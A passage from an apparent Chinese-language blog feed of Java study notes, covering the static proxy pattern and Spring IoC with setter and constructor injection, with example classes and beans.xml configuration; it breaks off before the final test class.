<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房东租出房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>中介：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyProxy</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        host.rent();</span><br><span class="line">        takeMoney();</span><br><span class="line">        giveMoney();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介带你看房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介收你钱&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">giveMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介给钱给房东&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MyProxy proxy = <span class="keyword">new</span> MyProxy(<span class="keyword">new</span> Host());</span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在上面的例子当中，我们可以发现，静态代理帮我们完成了如下事情：</p>
<ol>
<li>使得需要再次明确起来，无论是客户还是房东，需求都变得相当简单</li>
<li>复杂的事情交给了中介来做</li>
</ol>
<p>但是我们也发现了一个缺点：</p>
<ol>
<li>我们的代码量明显提升了很多，相比于直接添加功能</li>
<li>除此之外，如果客户很多，我们不得不手动添加一个个客户，工作量更大了。</li>
</ol>
<h2 id="结合增删改查事务理解"><a href="#结合增删改查事务理解" class="headerlink" title="结合增删改查事务理解"></a>结合增删改查事务理解</h2><p>在上面的例子中，我们学习到了代理模式的第一个好处，接下的例子将进一步表露出上面的设计模式的好处，并且它会展现静态代理的第二个好处，<strong>添加新功能而不修改原有代码</strong></p>
<p>增删改查事务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>业务实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增添了一个新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们突然想要添加新功能，打印我们使用了什么功能改怎么办？我们很明显可以这样做：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;使用了查询功能&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是很明显这种方式非常笨拙，并且如果是更多的功能，程序员就必须手写，并且一段一段的复制差不多的代码！（这里四个输出语句就让我感觉有点烦躁了</p>
<p>我们结合代理模式，其实可以很优雅的解决它：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;更新&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;查询&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]执行了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们就解决了功能的需求，并且，<strong>我们没有修改任何一行原代码</strong>，却上线了新的功能，除此之外，我们的代码拓展性依然很高，需要添加新功能只需要添加新的代理层即可，这时候我们将引出了第三个思想：</p>
<p><strong>任何功能的添加，修改，引入新的代理层来解决，客户只需要去导入最后一个代理增即可</strong></p>
]]></content>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring学习</title>
    <url>/2020/11/10/Spring%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h3 id="从今天开始学Sping"><a href="#从今天开始学Sping" class="headerlink" title="从今天开始学Sping"></a>从今天开始学Sping</h3><h5 id="1-IOC理论推导："><a href="#1-IOC理论推导：" class="headerlink" title="1.IOC理论推导："></a>1.IOC理论推导：</h5><ul>
<li><p>UserDao接口</p>
</li>
<li><p>UserDaompl实现类</p>
</li>
<li><p>Userservice业务接口</p>
</li>
<li><p>UserServiceimpl 业务实现类</p>
<p>在之前的业务当中，用户的需求会修改我们的代码，导致代码难以维护，所以我们开始使用了set值植入，set接口，实现不用修改代码，用户只需要调用接口就可以了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimp1</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao = <span class="keyword">new</span> UserDaolmp1();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先前的代码，在我们调用UserDao的时候因为写死了拓展，所以无法灵活的调用，我们可以使用接口的思想解放</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        userDao.getuser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    我们将之前写死的代码转变成了set方法，这样子当我们于main方法当中使用的时候：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        UserServiceimp1 userService = <span class="keyword">new</span> UserServiceimp1();</span><br><span class="line"></span><br><span class="line">        userService.setUserDao(<span class="keyword">new</span> UserDaoMysql());</span><br><span class="line">        userService.getUser();</span><br><span class="line"><span class="comment">//        用户实际调用业务层，dao层不需要接触</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用户只需要在set后面更改接口就可以了！</p>
<p>IOC的三层架构：Dao层负责实现方法，Service层负责调用Dao的方法，而main方法去调用Service的接口</p>
<p>使用该方法大大降低了业务的<strong>耦合性，</strong>使得业务的每一部分专心于做好自己的架构即可。</p>
<p><img src="Spring%E5%AD%A6%E4%B9%A0/image-20200620165913816.png" alt="image-20200620165913816"></p>
<h5 id="2-IOC的本质"><a href="#2-IOC的本质" class="headerlink" title="2.IOC的本质"></a>2.IOC的本质</h5><p>​    <strong>控制反转IoC</strong>(Inversion of Control),是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另-种说法。 没有IoC的程序中 ,我们使用面向对象编程 ,对象的创建 与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是:获得依赖对象的方式反转了。</p>
<p>​    而IOC就是Spring的核心思想！</p>
<h5 id="3-HelloSpring"><a href="#3-HelloSpring" class="headerlink" title="3.HelloSpring"></a>3.HelloSpring</h5><p>首先我们需要创建一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSpring</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStr</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.str = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>+<span class="string">&quot;str=&quot;</span>+str+<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建beans.xml，写入如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        使用spring创建对象，这些对象都称为bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Spring&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里，Spring帮我们做了这么一个事情：</p>
<p>在java当中，我们创建类的时候都是 类 对象名 = new 对象；</p>
<p>而在Spring当中，id为注册的对象名，property当中即可调用类当中的方法，value用于给方法的变量赋值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        获取spring的上下文对象</span></span><br><span class="line">        ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        接下来我们用Spring的管理即可</span></span><br><span class="line">        HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.tostring());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重点就是一切交给Spring，一切函数不再由你调用，让Spring调用即可。</p>
<h5 id="4-IOC创建对象"><a href="#4-IOC创建对象" class="headerlink" title="4.IOC创建对象"></a>4.IOC创建对象</h5><p>​    1.默认直接创建的时候利用的无参构造方法</p>
<p>​    2.有参构造的时候我们有三种方式来对参数进行构造：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   键对值的方式，最简单--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span></span><br><span class="line">        </span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        用下标来赋值--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        用类型来赋值，不推荐使用--&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>注意事项:</strong></p>
<p>​        在Spring当中，实际上当我们利用Spring进行Context的创建的时候，Spring已经将<strong>全部对象导入</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        接下来我们用Spring的管理即可</span></span><br><span class="line">HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(hello.tostring());</span><br></pre></td></tr></table></figure>

<p>也就是说，如果你的Bean当中即使含有多个类，Spring也将他们全部导入并初始化，用户想要什么去取出来即可。</p>
<h5 id="5-Spring的配置"><a href="#5-Spring的配置" class="headerlink" title="5.Spring的配置"></a>5.Spring的配置</h5><ul>
<li><p>别名(已没用了)</p>
</li>
<li><p>Bean的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> <span class="attr">name</span>=<span class="string">&quot;u1,u2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里的id就是注册名，class就是调用类<strong>name已经可以取别名了！</strong></p>
</li>
<li><p>Import</p>
<p>便于多人运动，大伙一起开发的时候，就可以将他们包含在一起了~</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h5 id="6-DI依赖注入"><a href="#6-DI依赖注入" class="headerlink" title="6.DI依赖注入"></a>6.DI依赖注入</h5><p>​        </p>
<h6 id="6-1构造方法注入"><a href="#6-1构造方法注入" class="headerlink" title="6.1构造方法注入"></a>6.1构造方法注入</h6><p>​    重写构造方法</p>
<h6 id="6-2set方法注入【重点】"><a href="#6-2set方法注入【重点】" class="headerlink" title="6.2set方法注入【重点】"></a>6.2set方法注入【重点】</h6><p>​    依赖：beans的对象依赖于容器！</p>
<p>​    注入：bead当中的所有属性·，由容器来注入。</p>
<p><strong>【环境搭建】</strong></p>
<p>​    1.复杂类型</p>
<pre><code> 2.真实测试对象</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String string;</span><br><span class="line">    <span class="keyword">private</span> String[] book;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; card;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    3.beans.xml</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--    普通注入--&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;hello&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> name=<span class="string">&quot;u1,u2&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg name=<span class="string">&quot;str&quot;</span> value=<span class="string">&quot;www&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--        ref注入--&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean  id=<span class="string">&quot;address2&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Address&quot;</span> /&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Student&quot;</span> id=<span class="string">&quot;student&quot;</span>&gt;</span><br><span class="line">&lt;!--数组注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;book&quot;</span>&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">            &lt;value&gt;红楼梦&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;水浒传&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;三国演义&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;西游记&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--list注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;hobbies&quot;</span>&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;起飞&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        map注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;card&quot;</span>&gt;</span><br><span class="line">            &lt;map&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;身份证&quot;</span> value=<span class="string">&quot;440000000032001&quot;</span>/&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;银行卡&quot;</span> value=<span class="string">&quot;2213123032001&quot;</span>/&gt;</span><br><span class="line">            &lt;/map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        set注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;games&quot;</span>&gt;</span><br><span class="line">            &lt;set&gt;</span><br><span class="line">                &lt;value&gt;lol&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;cod&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;bot&lt;/value&gt;</span><br><span class="line">            &lt;/set&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;</span><br><span class="line">&lt;!--        配置注入--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt;</span><br><span class="line">                &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>​    4.测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        获取spring的上下文对象</span></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        接下来我们用Spring的管理即可</span></span><br><span class="line">        Student student = (Student) context.getBean(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">        System.out.println(student.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h6 id="6-3其他方法注入"><a href="#6-3其他方法注入" class="headerlink" title="6.3其他方法注入"></a>6.3其他方法注入</h6><p>P,就是set注入，C就是创造器注入</p>
<h1 id="1-Spring的bean的本质"><a href="#1-Spring的bean的本质" class="headerlink" title="1.Spring的bean的本质"></a>1.Spring的bean的本质</h1><p>实际上就是反转，注入的值，创建对象全部交给Spring的XML来配置了！实际上就是利用Set注入</p>
<p>回顾昨天的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//我们照样是new 了一个新的对象</span></span><br><span class="line"><span class="keyword">package</span> com.ys.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSQLServer</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQLSERVER use it&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重写DAO层的方法，之后在service层当中进行操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个实现接口类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserDao <span class="title">getUserDao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们这里设置了一个Set方法，让userDao允许用户的自定义创建，那么他需要什么我们就给什么~</p>
<p>最终测试类：</p>
